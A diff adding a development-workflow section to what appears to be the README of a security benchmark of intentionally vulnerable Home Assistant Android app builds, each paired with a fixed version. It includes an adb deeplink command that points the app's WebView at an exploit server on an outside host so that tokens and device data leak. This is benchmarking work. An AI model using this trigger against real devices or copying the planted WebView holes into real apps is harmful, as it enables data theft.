@@ -72,6 +72,68 @@ cd apps/home-assistant/base/
 git worktree list
 ```
 
+## Development workflow
+
+When modifying a vulnerability sample, follow this sequence:
+
+### 1. Analyze (read-only)
+- Read the sample entry in `apps/home-assistant/design.md` to understand intended vulnerability design
+- Diff `vuln/<id>` vs `master` to see all changes
+- Diff `vuln/<id>` vs `fix/<id>` to see the fix approach
+- Check `webview漏洞分类说明.md` for the vulnerability category definition
+
+### 2. Plan (before any edits)
+- Identify which changes are **vulnerability-specific** (must stay), **shared infrastructure** (must stay), and **unnecessary artifacts** (should remove)
+- Write a brief plan listing each file and what will change. Present to user for approval.
+
+### 3. Implement (vuln first, then fix)
+- Switch to vuln branch: `git switch vuln/<id>`
+- Make changes, build from `W:\` (or with `-x` flags), fix any compilation errors
+- Commit vuln: `git add . && git commit -m "vuln: <description>"`
+- Switch to fix branch: `git switch fix/<id>`
+- Apply same non-vulnerability changes (cleanup, encoding fixes, etc.)
+- Build, commit fix
+- Copy APKs to `apk/home-assistant/vuln/` and `apk/home-assistant/fix/`
+
+### 4. Verify (both APKs on emulator)
+```bash
+# 1. Connect emulator
+adb connect 127.0.0.1:7555  # MuMu
+
+# 2. Install vuln APK
+adb -s 127.0.0.1:7555 install -r apk/home-assistant/vuln/<id>.apk
+
+# 3. Start exploit server
+cd exp/home-assistant/<id>/
+rm -rf received/*
+python server.py &
+
+# 4. Trigger exploit
+adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW \
+  -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/<id>"
+
+# 5. Check results (vuln should leak data)
+ls received/
+cat received/*
+
+# 6. Repeat steps 2-5 with fix APK (fix should NOT leak sensitive data)
+```
+
+**Verification criteria:**
+- **Vuln**: Exploit succeeds — sensitive data (device states, tokens, etc.) appears in `received/`
+- **Fix**: Exploit fails — no sensitive data leaked. Ping/timestamp data is OK (JS can still run) but the vulnerability-specific capability (bridge access, file read, etc.) must be blocked
+
+### 5. Finalize
+- Update `benchmark_samples.json` if status changed
+- Update `exp/home-assistant/<id>/readme.md` with correct verification steps
+- Commit main repo changes
+
+### Anti-patterns to avoid
+- **Don't modify source to work around build issues.** Use Gradle `-x` flags or environment fixes instead. Source code should only change for vulnerability-related reasons.
+- **Don't delete shared infrastructure.** The deeplink, `isDeeplinkFlow`, manifest intent-filter, and `DefaultFailFastHandler` changes are shared across all deeplink-based samples. Fix them if broken, but don't remove them.
+- **Don't leave dead code in fix branches.** The fix should cleanly remove or restrict the vulnerability code. Don't just comment it out or leave it behind a confusing condition.
+- **Don't commit IDE artifacts.** `.vscode/`, `.idea/`, and similar files should not be in sample branches.
+
 ## Vulnerability categories (5 classes, 17 sub-types)
 
 | Category | IDs | Description |
